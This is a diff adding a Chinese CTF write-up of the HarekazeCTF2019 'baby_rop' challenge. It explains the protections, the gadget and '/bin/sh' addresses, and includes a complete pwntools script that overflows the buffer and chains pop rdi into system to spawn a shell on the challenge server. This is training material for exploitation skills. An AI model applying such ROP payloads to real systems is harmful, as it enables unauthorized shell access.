@@ -1662,3 +1662,50 @@ RSP ->| 0x7fff... |   | 0x400c83    |  <-- pop_rdi_ret (Gadget地址)
 
 重新从 main 开始运行。我们获得了第二次输入的机会。
 
+### 例题 1：[HarekazeCTF2019]baby_rop
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop)
+
+<img width="335" height="121" alt="ef278c62e6196864e436221f2bb4cc4b" src="https://github.com/user-attachments/assets/cb63746c-f09f-4059-b144-a8c79d8fee3e" />
+
+栈不可执行。
+
+<img width="341" height="45" alt="d1b5c630feabbb7668edfdc7fc77a055" src="https://github.com/user-attachments/assets/b124bc63-c2c2-42a2-9db4-f48b8378a3a1" />
+
+`rdi_pop_ret = 0x400683`
+
+打开 IDA 发现 没有后门函数，但是有 binsh：
+
+<img width="506" height="183" alt="image" src="https://github.com/user-attachments/assets/182b09ff-7b65-48c3-bcc2-ad9b5c6ec68c" />
+
+主函数还有一个 system：
+
+<img width="1006" height="318" alt="image" src="https://github.com/user-attachments/assets/70481f40-4158-4e6d-816f-6b5e6b01f831" />
+
+<img width="730" height="392" alt="image" src="https://github.com/user-attachments/assets/8a4b4213-3c31-442f-8322-929f042b0bb7" />
+
+那么 这就是一个普通的 rop 链。
+
+```
+# written by Sonnety
+from pwn import*
+context.arch = "amd64"
+
+host = "node5.buuoj.cn"
+port = 29812
+
+io=remote(host,port)
+offset = 24
+system = 0x400490
+binsh = 0x601048
+pop_rdi_ret = 0x400683
+payload = b"A"*offset + p64(pop_rdi_ret) + p64(binsh) + p64(system)
+
+def main():
+    io.sendline(payload)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
